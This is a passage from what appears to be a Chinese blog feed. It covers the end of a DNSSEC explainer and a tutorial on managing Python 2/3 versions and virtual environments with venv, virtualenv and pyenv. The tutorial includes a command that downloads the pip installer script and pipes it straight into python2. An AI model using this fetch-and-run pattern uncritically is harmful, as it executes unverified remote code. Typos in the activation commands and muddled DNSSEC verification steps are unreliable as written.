Signer</h3><p>委派签名者，即DS。</p><p>DNSSEC引入了DS记录，用于在父区域和子区域之间建立<em>信任链</em>。区域操作员将子区域的公共KSK的Hash作为DS记录发布到父区域。当解析器引用子区域时，父区域提供DS记录，解析器通过比较子区域公共KSK的哈希值和父区域的DS记录来验证公共KSK的有效性。如果匹配成功，解析器就可以信任子区域的所有记录。</p><div align="center">  <img style="width:100%;" src="https://img.ma5hr00m.top/blog/20231208123822.png" alt="KSK&ZSK"></div><h3 id="信任链"><a href="#信任链" class="headerlink" title="信任链"></a>信任链</h3><p>这一套操作下来，我们使用RRset+ZSK+KSK的认证机制保证了区域内的安全，又通过DS保证了子区域到父区域的安全。那问题来了：我们应该如何信任DS记录呢，换句话说，我们该如何得知父区域是否安全可信？</p><p>那自然是去找父区域的父区域啦～</p><p>DS记录本身就像其他任何RRset一样签署，这意味着它在父级中也具有相应的RRSIG。我们所要做的就是不断重复上面的过程，区域内的ZSK+KSK验证做完就去找父区域的公共KSK，父区域的KSK+ZSK验证完成就继续往上找……这样的验证方式就会自底而上形成一条链子，称为<em>信任链</em>。</p><p>链子总归是有个头的。我们向链子的根源不断摸索，最后看到的是——</p><p><img src="https://www.cloudflare.com/img/products/official-ceremony-photo.jpg" alt="DNSSEC根签名仪式人员在ICANN的合影"></p><h3 id="根域签名仪式"><a href="#根域签名仪式" class="headerlink" title="根域签名仪式"></a>根域签名仪式</h3><p>像前文所说，我们不断重复验证，最终来到信任链的终点（或者说起点）——<em>根DNS区域</em>。那现在问题来了：根区域没有父区域。我们可以在根DNS区域获取一个<code>RRSIG</code>记录，通过这个记录验证根名称服务器的公共KSK和ZSK。但我们没有所需的DS来验证这个<code>RRSIG</code>记录的安全性。</p><p>怎么办呢？<br>即使是聪明的大脑也没有合适的解决方法，所以，我们采取了朴实无华的方法……</p><p>每隔一段时间，相关负责机构会召集一群人，以公开且经严格审核的方式签署<em>根DNSKEY RRset</em>，继而产生一条<code>RRSIG</code>记录用于验证根名称服务器的公共KSK和ZSK。也就是说，根区域的公共KSK是没有DS记录来保证安全性的，我们只是假定它足够安全有效。</p><p>当然啦，事实上也足够安全。我无意去介绍这个仪式的流程，总之就是十分的严谨繁琐冗长——都是为了互联网的安全。仪式最后得到的就是那条<code>RSSIG</code>数据。</p><p>前面说到过，整个仪式的过程是公开的，这个<a href="https://www.youtube.com/watch?v=EOb0Zu3hy2U">视频</a>是距本篇博客写作最近的一次根域签名仪式录播，长达4.5h。这篇<a href="https://www.cloudflare.com/zh-cn/dns/dnssec/root-signing-ceremony/">文章</a>则是对根域签名仪式全过程的记述。</p><h3 id="为什么需要KSK"><a href="#为什么需要KSK" class="headerlink" title="为什么需要KSK"></a>为什么需要KSK</h3><p>DNS是一个分层系统，各区域很少独立运行。<br>像上文说的DS记录，就是为了将父区域的信任传递给子区域，DS记录本身就是公共KSK的Hash。<br>只要更换KSK就需要更改父区域的DS记录。<br>而更改DS记录是一个多步骤的过程，如果执行不正确，最终可能会破坏该区域。</p><p>这意味着，更换KSK的成本很高。如果我们把ZSK和KSK合二为一，使其既承担信任传递功能又承担加密RRset功能，那我们每次想要对子区域内密钥进行更换都会变得繁琐。而更换ZSK只需要在特定区域内进行操作，不会涉及到父区域的DS记录的修改。将二者独立开来，就可以在保证信任链的前提下，提供更好的灵活性，使区域操作员更容易更换ZSK，以保证RRset的安全。</p><p>KSK用于建立信任链，确保子区域的公钥的有效性；而ZSK用于签名特定区域的数据，保证数据的完整性和身份验证。d</p><h2 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h2><p>前面讲得比较零散，可能你仍不清楚一次<code>DNS with DNSSEC</code>查询到底要怎么将以上所有点结合起来。我下面以<code>ma5hr00m.top</code>为例，走一遍完整的流程：</p><ol><li>解析器向根域名服务器发送查询请求，询问顶级域名服务器(.域)的NS记录。</li><li>根域名服务器回复解析器，提供顶级域名服务器(.域)的NS记录。</li><li>解析器向顶级域名服务器(.域)发送查询请求，询问<code>.ma5hr00m.top</code>域的NS记录。</li><li>顶级域名服务器(.域)回复解析器，提供<code>ma5hr00m.top</code>域的NS记录。</li><li>解析器向<code>ma5hr00m.top</code>域的权威域名服务器发送查询请求，询问<code>ma5hr00m.top</code>域的A记录。</li><li>权威域名服务器回复解析器，提供<code>ma5hr00m.top</code>域的A记录为<code>101.35.240.239</code>。</li><li>解析器同时获取到<code>ma5hr00m.top</code>域的A记录的<code>RRSet</code>的签名<code>RRSIG</code>，并使用该签名的<code>ZSK</code>进行验证，确保数据的完整性和身份验证。</li><li>解析器向<code>ma5hr00m.top</code>域的权威域名服务器发送查询请求，询问<code>ma5hr00m.top</code>域的<code>DNSKEY</code>记录。</li><li>权威域名服务器回复解析器，提供<code>ma5hr00m.top</code>域的<code>ZSK</code>和<code>KSK</code>公钥，并同时提供<code>DNSKEY RRSet</code>的签名<code>RRSIG</code>。</li><li>解析器使用获取到的<code>KSK</code>验证上一步得到的<code>DNSKEY</code>记录，确保数据的完整性和身份验证。</li><li>解析器使用获取到的<code>ZSK</code>验证第五步得到的A记录，确保数据的完整性和身份验证。</li><li>为了保证<code>DNSKEY RRSIG</code>中的KSK不被伪造，解析器请求<code>.ma5hr00m.top</code>域与<code>ma5hr00m.top</code>相关的DS记录，并获取到DS记录的<code>RRSIG</code>。</li><li>解析器计算<code>KSK</code>的哈希值，并使用获取到的DS记录的<code>RRSIG</code>进行验证，确保数据的完整性和身份验证。</li><li>解析器重复步骤12和步骤13，向顶级域名服务器(.域)请求<code>.ma5hr00m.top</code>域的DS记录，并获取到DS记录的<code>RRSIG</code>。</li><li>解析器重复步骤12和步骤13，向根域名服务器请求<code>.ma5hr00m.top</code>域的DS记录，并获取到DS记录的<code>RRSIG</code>。</li><li>解析器使用根域名服务器提供的DS记录的<code>RRSIG</code>进行验证，确保数据的完整性和身份验证。</li><li>验证通过后，解析器将最终的结果<code>101.35.240.239</code>返回给用户。</li></ol><p>然后，我们就安全地获取到了<code>ma5hr00m.top</code>对应的IP地址：<code>101.35.240.239</code>！</p><h2 id="DNSSEC的优劣"><a href="#DNSSEC的优劣" class="headerlink" title="DNSSEC的优劣"></a>DNSSEC的优劣</h2><p>原理讲完了，说说为什么要使用DNSSEC。</p><p>作为一个安全拓展，使用DNSSEC最重要的好处就是保护DNS提供的数据，确保互联网上的路标（DNS记录）指向正确的内容或服务，以防止攻击者篡改DNS数据，导致用户被引导到错误的网站或不安全的地方。从根本上来讲，就是保护用户的安全。具体点说，就是可以在一定程度上防止DNS投毒、DNS劫持、DNS重放等攻击手段。</p><p>数据变得可信之后，相继地，这份可信的数据也会促进全球DNS的应用。我们利用这些数据创建了一个<em>安全的域名&#x2F;值数据库</em>，这个安全的数据库可以提供多种创新机会，支持新的技术、服务和设施。互联网研究人员就可以利用这些“干净”的数据来做一些有趣的实验，研发一些新技术。比如DANE（DNS-based Authentication of Named Entitie）就是在利用DNS中受DNSSEC保护的数据，期望解决当前互联网安全连接方法中存在的一些漏洞。</p><p>此外呢，从广义上来讲，DNS 涉及两个方面：发布，由注册人或其代理执行；以及解析，通常由网络运营商（例如，互联网服务提供商）来完成。<br>也就是说，使用DNSSEC需要两端同时发力。</p><p>而DNSSEC很早就大规模部署了。所有根域名服务器在2010年就部署了DNSSEC，若干顶级域名（<code>.org</code>、<code>.com</code>、<code>.net</code>和<code>.edu</code>等）服务器也在2011年部署了DNSSEC。<br>相比其他DNS保护措施，DNSSEC的普及度可以说是遥遥领先了，多数公共的域名服务器都支持它。</p><blockquote><p>DNSSEC支持情况：<a href="https://en.wikipedia.org/wiki/Public_recursive_name_server#Notable_public_DNS_service_operators">Notable public DNS servicde operators</a></p></blockquote><p>DNSSEC也是最早大规模部署的。在 2010 年的时候，所有根域名服务器都已经部署了 DNSSEC。到了 2011 年，若干顶级域名（.org 和 .com 和 .net 和 .edu）也部署了 DNSSEC。</p><p>但是，DNSSEC也并不完美。DNSSEC仅仅是对传输的数据做了数字签名，但未进行加密。如果你的网络流量被别人监视，他依然可以得知你在访问什么域名。可是是出于这个原因，Chrome曾支持过DNSSEC但随后移除，Firefox则从未支持过DNSSEC。</p><p>另外，DNSSEC的使用显著增加了DNS查询响应的数量（需要额外的字段和加密信息来正确验证记录），这就增加了计算机增加遭受分布式拒绝服务 (DDoS) 攻击的风险。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>可能是出于对部署DNSSEC收益的考量，DNS出现于1980年，相关安全问题在08-11年大规模爆发，直到2013年，DNSSEC才开始快速普及。截至2021年，尽管DNSSEC解析服务器只占总量的 17.4%，但其请求量已经超过七成。按照国家来看，平均使用率为14%，而中国的DNSSEC使用率仅6%左右。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cloudflare.com/zh-cn/learning/dns/what-is-dns/">什么是 DNS | DNS 的工作方式</a>，by CloudFlare</li><li><a href="https://www.cloudflare.com/zh-cn/dns/dnssec/how-dnssec-works/">DNSSEC 如何运作</a>，by CloudFlare</li><li><a href="https://www.wosign.com/News/news_2019032201.htm">4种DNS安全协议对比</a>，by WoTrust</li><li><a href="https://www.cernet.com/hlwjsyj/202009/4606.html">重启DNS根密钥服务器的七个人</a>，by 赛尔网络</li><li><a href="https://www.icann.org/zh/system/files/files/octo-006-24jul20-zh.pdf">DNSSEC：保护DNS的安全</a>，by ICANN首席技术官办公室</li><li><a href="https://herbertgao.com/15/#DNSSEC">对比4种强化域名安全的协议</a>，by HerbertGao0</li><li><a href="https://www.edu.cn/xxh/zt/tj/202305/t20230518_2408472.shtml">DNSSEC的选择：Yes还是No？</a>，by 中国教育网络</li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中Python环境/版本管理</title>
      <link href="/2023/11/08/2023/python-env/"/>
      <url>/2023/11/08/2023/python-env/</url>
      
        <content type="html"><![CDATA[<p>阿菇觉得 Python 的环境&#x2F;版本管理实在是依托，感觉不如 Node.js。<br>尤其是在 Linux 环境下，多数发行版的系统组件、工具依赖自带的 Python，折腾系统自带的 Python 环境时，一个搞不好就会把整个系统干掉。</p><p>同时，研究安全的小伙伴经常用各种工具，而很多工具又是是基于 python2 的，而当前使用的绝大多数 Linux 发行版都自带的 python3，不方便。</p><p>另一方面，我们的各种 python 项目都会有各自需要的依赖，而我们总不可能把所有需要的依赖库都直接全局安装，这很丑陋，而且很多情况下不方便项目的迁移。</p><blockquote><p>流行的 python 项目&#x2F;工具基本都是提供了 <code>requirements.txt</code>，用户需要手动本地安装。</p></blockquote><p>Windows 系统中，我们可以直接使用强大的 <a href="https://www.anaconda.com/">Anaconda</a> 管理我们的 python 环境以及版本，Linux 就不行了。<br>这篇文章，总结了阿菇在 python 环境&#x2F;版本管理方面的经验，可供参考。</p><p>::: warning<br>本篇文章使用环境：系统 <code>Ubuntu22.04</code>，自带 <code>python3.10.12</code>。<br>:::</p><h2 id="py3环境管理-venv"><a href="#py3环境管理-venv" class="headerlink" title="py3环境管理 - venv"></a>py3环境管理 - venv</h2><p>python3 推出了 <code>venv</code> 模块，python3.6 及以上已经默认安装，python3.5 需要手动安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-venv</span><br></pre></td></tr></table></figure><p>venv 模块支持创建轻量级的虚拟环境，每个环境拥有它们自己安装在其 <code>/site</code> 目录下的 python 软件包（依赖）集合。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>使用以下指令可以创建一个 python 虚拟环境，python 版本与当前系统使用的 python 版本相同：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv <span class="built_in">env</span></span><br></pre></td></tr></table></figure><p>实际效果就是在你的当前目录下创建一个名为 <code>env</code> 的目录，其中包括了特定的 python 解释器、软件库和二进制文件。你可以把上面指令中的 <code>env</code> 替换为你想要的虚拟环境名称（也就是那个目录名称），习惯上我们会将其命名为 <code>venv</code> 或者 <code>.venv</code>，通常放在项目根目录下。</p><p>需要遵守一些默认规范。python 虚拟环境是可丢弃的，也就是说，我们不会将其一并打包的项目中，我们只需要给用户提供 <code>requirements.txt</code> 文件，用户自己创建一个虚拟环境并安装所需依赖。开发者不应该把任何项目代码放到虚拟环境目录中。同时，我们也不会移动虚拟环境，哪里需要就在哪里创建。</p><p>创建好虚拟环境后，它只是一个放在那儿的目录，需要手动激活。</p><p>假设你是在当前目录下创建了名为 <code>venv</code> 的虚拟环境，你使用以下指令将这个虚拟环境激活：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ./venv/bin/active</span><br></pre></td></tr></table></figure><p>然后你可以发现命令行中标志出当前命令行使用了虚拟环境，虚拟环境名称默认与当前项目名称相同。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/63d4846c761b4d5bb86b8863cd745a83~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=980&h=365&s=57542&e=png&b=0e1019" alt="20231102001458"></p><blockquote><p>图中是 <a href="https://www.zsh.org/">zsh</a>，配置了 <a href="https://ohmyz.sh/">oh-my-zsh</a>，应用了 <a href="https://github.com/romkatv/powerlevel10k">powerlevel10K 主题</a>，通过 <a href="https://tabby.sh/">tabby 模拟终端工具</a> 使用，是一个非常 nice 的组合，可以试试看！</p></blockquote><p>此时使用 <code>pip --version</code> 会提示用户使用的是虚拟环境中的 <code>pip</code> 包管理工具。激活虚拟环境后我们就可以在这里面肆意安装我们需要的各种依赖了，虚拟环境与外界是隔离的，你可以想象成虚拟机，一般不会影响到系统本身。</p><p>使用完虚拟环境后，执行以下指令关闭虚拟环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><h3 id="进一步"><a href="#进一步" class="headerlink" title="进一步"></a>进一步</h3><p>就是如此的干净清爽，我们只需用系统自带的 python 创建虚拟环境即可，之后的一切依赖都放在各自的虚拟环境中，不用把自己系统的 python 软件包搞得一团糟。</p><p>阿菇的建议是：<em>不要在自己的系统中安装任何额外的 python 软件包，把自带的 python 当作一个虚拟环境创建器，所有需要依赖的项目都单独创建一个虚拟环境</em>。</p><p>现在问题来了。我们使用这个指令只能创建与当前版本相同的 python 虚拟环境，并不能满足我们的需求，下一步该怎么做呢？</p><h2 id="Linux中使用python2"><a href="#Linux中使用python2" class="headerlink" title="Linux中使用python2"></a>Linux中使用python2</h2><p>很多 Linux 发行版不带 python2 环境，但我们有时需要用。可以在系统中配置一个 python2 环境。</p><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p>包管理工具直接安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python2</span><br></pre></td></tr></table></figure><p>安装好之后指定使用 <code>python2</code> 即可，默认路径是 <code>/usr/bin/python2</code>，此时可以使用 <code>python2</code> 来运行代码了。</p><blockquote><p>这里默认安装 python2.7</p></blockquote><h3 id="pip2"><a href="#pip2" class="headerlink" title="pip2"></a>pip2</h3><p>为了方便地管理 python2 依赖，我们还需要 pip2。</p><p>但通过 ubuntu 软件源安装的 python2 不自带 pip2 管理工具。这是因为 Python 2.7 的支持周期已于 2020 年 1 月 1 日结束，pip 21.0 也于 2021 年 1 月停止对 Python 2.7 的支持。</p><p>只能手动安装。</p><p>假设你已经按照上文描述安装好了 python2，使用以下命令拉取 <a href="pypa.io">pypa.io</a> 的安装脚本并用 python2 执行即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O - https://bootstrap.pypa.io/pip/2.7/get-pip.py | python2</span><br></pre></td></tr></table></figure><p>安装成功后重启终端，然后使用 <code>pip2 --version</code> 检查是否安装成功。现在，你已经在本地有了 python2.7 环境和对应的 pip2 包管理工具。</p><h2 id="py2环境管理-virtualenv"><a href="#py2环境管理-virtualenv" class="headerlink" title="py2环境管理 - virtualenv"></a>py2环境管理 - virtualenv</h2><p>只有本地 python2 环境肯定不行，我们不能容忍我们的软件包变成依托。</p><p>管理 python2.7 环境，我们可以使用 venv 的前身 —— <code>virtualenv</code>。</p><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>与 venv 基本一致，这里不再赘述：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">pip2 install virtualenv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建虚拟环境 env</span></span><br><span class="line">virtualenv <span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> ./env/bin/avtivate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭虚拟环境</span></span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure><p>激活虚拟环境后，使用 <code>python --version</code> 查看虚拟环境的 python 版本，会提示：<code>Python 2.7.18</code>。这与你安装的 python2 版本有关，自行判断。</p><h3 id="为什么不用-venv"><a href="#为什么不用-venv" class="headerlink" title="为什么不用 venv"></a>为什么不用 venv</h3><p>尝试 <code>pip2 install venv</code> 会提示：<code>ERROR: Could not find a version that satisfies the requirement venv (from versions: none)</code>，也就是官方没有提供对应的模块版本。</p><p>或许你在什么地方看到过使用 venv 指定 python 解释器来创建对应虚拟环境，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv --python=/usr/bin/python2 venv</span><br></pre></td></tr></table></figure><p>不知道是否真的可行，至少阿菇这里行不通，会提示没有存在不支持的参数 <code>--python</code>，不知道是不是 venv 版本问题。</p><h3 id="再进一步"><a href="#再进一步" class="headerlink" title="再进一步"></a>再进一步</h3><p>现在有了 python2.7 和 python3.10，也做到了虚拟环境，已经能胜任多数使用场景了。</p><p>但阿菇并不满意，版本管理不够精细。我们该如何使用其他更细分的版本呢，比如 python3.8？</p><h2 id="py版本管理工具-pyenv"><a href="#py版本管理工具-pyenv" class="headerlink" title="py版本管理工具 - pyenv"></a>py版本管理工具 - pyenv</h2><p>有一款合适的 Python 版本管理工具—— <code>pyenv</code>。</p><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>使用 Git 直接拉取 pyenv 到本地就行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pyenv/pyenv.git ~/.pyenv</span><br></pre></td></tr></table></figure><p>然后需要修改环境变量，这个和的命令行有关，这里提供 zsh 和 bash 两个版本的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zsh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27;</span> &gt;&gt; ~/.zprofile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27;</span> &gt;&gt; ~/.zprofile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(pyenv init --path)&quot;&#x27;</span> &gt;&gt; ~/.zprofile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(pyenv init -)&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;if shopt -q login_shell; then&#x27;</span> \</span><br><span class="line">      <span class="string">&#x27;\n  export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27;</span> \</span><br><span class="line">      <span class="string">&#x27;\n  export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27;</span> \</span><br><span class="line">      <span class="string">&#x27;\n eval &quot;$(pyenv init --path)&quot;&#x27;</span> \</span><br><span class="line">      <span class="string">&#x27;\nfi&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;if [ -z &quot;$BASH_VERSION&quot; ]; then&#x27;</span>\</span><br><span class="line">      <span class="string">&#x27;\n  export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27;</span>\</span><br><span class="line">      <span class="string">&#x27;\n  export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27;</span>\</span><br><span class="line">      <span class="string">&#x27;\n  eval &quot;$(pyenv init --path)&quot;&#x27;</span>\</span><br><span class="line">      <span class="string">&#x27;\nfi&#x27;</span> &gt;&gt;~/.profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;if command -v pyenv &gt;/dev/null; then eval &quot;$(pyenv init -)&quot;; fi&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><p>执行完成后就可以使用 pyenv 了。</p><blockquote><p>上面的指令中中已经包括重新加载命令行配置的指令。</p></blockquote><p>执行 <code>pyenv -h</code> 可以查看手册，然后上手用就行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前 python 版本</span></span><br><span class="line">pyenv version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有 python 版本</span></span><br><span class="line">pyenv versions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有可安装的 python 版本</span></span><br><span class="line">pyenv install --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装指定 python 版本</span></span><br><span class="line">pyenv install 3.8.12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装新版本后 rehash</span></span><br><span class="line">pyenv <span class="built_in">rehash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定全局 python 版本</span></span><br><span class="line">pyenv global 3.8.12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定 python 版本</span></span><br><span class="line">pyenv uninstall 3.8.12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定多个全局版本, python3版本优先</span></span><br><span class="line">pyenv global 3.8.12 2.7.10</span><br></pre></td></tr></table></figure><h3 id="加速pyenv"><a href="#加速pyenv" class="headerlink" title="加速pyenv"></a>加速pyenv</h3><p>国内访问外网不方便，执行 <code>pyenv install</code> 时可能会非常慢，甚至超时终止访问。我们有几种方案解决这个问题。</p><h4 id="01-手动下载压缩包"><a href="#01-手动下载压缩包" class="headerlink" title="01 手动下载压缩包"></a>01 手动下载压缩包</h4><p>网上最多的是手动下载压缩包到 pyenv 缓存，然后再用 <code>pyenv install</code> 安装。</p><p>国内有 python 镜像站，我们进去找到对应版本压缩包下载就行：<a href="https://registry.npmmirror.com/binary.html?path=python/">国内镜像站</a></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/823d54c959b8426bb3b901c9a28838a5~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1672&h=755&s=175052&e=png&b=ffffff" alt="20231102104041"></p><p>先找到所需版本的下载链接，右键复制链接地址，然后使用 wget 拉取到本地 pyenv 缓存中，再执行命令下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://registry.npmmirror.com/-/binary/python/2.7.10/Python-2.7.10.tar.xz -P ~/.pyenv/cache</span><br><span class="line">pyenv install 2.7.10</span><br></pre></td></tr></table></figure><h4 id="02-终端代理"><a href="#02-终端代理" class="headerlink" title="02 终端代理"></a>02 终端代理</h4><p>这个同样适用于其他下载慢的情况，设置 shell 的 <code>http_proxy</code> 环境变量，让终端走代理。</p><p>前提是你要有一个代理服务器，或者有相应的工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><h4 id="03-pyenv镜像"><a href="#03-pyenv镜像" class="headerlink" title="03 pyenv镜像"></a>03 pyenv镜像</h4><p>使用国内镜像站中的压缩包资源，这里以<a href="http://mirrors.sohu.com/python/">搜狐 pyenv 镜像源</a>为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v=3.5.2|wget http://mirrors.sohu.com/python/<span class="variable">$v</span>/Python-<span class="variable">$v</span>.tar.xz -P ~/.pyenv/cache/;pyenv install <span class="variable">$v</span></span><br></pre></td></tr></table></figure><h2 id="py环境管理工具-pyenv-virtualenv"><a href="#py环境管理工具-pyenv-virtualenv" class="headerlink" title="py环境管理工具 - pyenv-virtualenv"></a>py环境管理工具 - pyenv-virtualenv</h2><p>pyenv 可以实现快捷的 python 版本管理，我们可以使用它的 <code>virtualenv</code> 插件一并实现虚拟环境管理。</p><h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><p>拉取脚本然后添加环境变量，再重启 shell 即可，这里以 zsh 为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装插件</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pyenv/pyenv-virtualenv.git $(pyenv root)/plugins/pyenv-virtualenv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加环境变量到 zsh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(pyenv virtualenv-init -)&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 zsh</span></span><br><span class="line"><span class="built_in">exec</span> zsh</span><br></pre></td></tr></table></figure><p>然后我们就可以使用 pyenv 的 virtualenv 插件管理虚拟环境了。只要是你已经通过 pyenv 安装的版本，都可以使用该插件创建对应的虚拟环境。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv virtualenv 3.8.12 v3812env</span><br></pre></td></tr></table></figure><p>但是要注意，<code>virtualenv</code>  插件的逻辑和 venv 以及 py2 的 virtualenv 模块不同，它不是在当前目录下创建虚拟环境目录，而是在 <code>～/.pyenv</code> 目录中安装。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a8a617a9327746d69b0573d010a4d8a3~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=880&h=167&s=36334&e=png&b=15192b" alt="20231102133150"></p><p>使用 virtualenv 插件的虚拟环境也很方便：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出当前虚拟环境</span></span><br><span class="line">pyenv virtualenvs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line">pyenv activate v3812env</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出虚拟环境</span></span><br><span class="line">pyenv deactivate v3812env </span><br></pre></td></tr></table></figure><p>至此，我们基本实现了 Linux 下方便的管理各版本的 python 虚拟环境，这允许我们为每个项目&#x2F;工具创建独立的虚拟环境，有效的维护了系统本身的整洁。</p><h3 id="或许，还可以……？"><a href="#或许，还可以……？" class="headerlink" title="或许，还可以……？"></a>或许，还可以……？</h3><p>以上是我们的 python 版本&#x2F;环境管理方案，已经够用了，但或许你并不满足。身为合格的程序员，你对环境管理有着更高的需求。</p><p>那还有更优秀的解决方案吗？</p><p>有！</p><h2 id="Nox-堂堂登场！"><a href="#Nox-堂堂登场！" class="headerlink" title="Nox 堂堂登场！"></a>Nox 堂堂登场！</h2><p><img 